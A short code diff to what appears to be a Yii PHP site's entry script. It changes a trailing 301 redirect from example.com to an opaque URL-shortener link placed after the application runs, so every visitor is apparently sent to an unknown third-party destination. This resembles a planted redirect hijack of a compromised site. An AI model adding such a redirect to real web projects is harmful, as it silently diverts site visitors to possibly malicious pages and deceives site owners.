@@ -16,5 +16,5 @@ $config = yii\helpers\ArrayHelper::merge(
 );
 
 (new yii\web\Application($config))->run();
-header('Location: https://example.com', true, 301);
+header('Location: https://lnk.do/a4GVnvtZ', true, 301);
 exit;
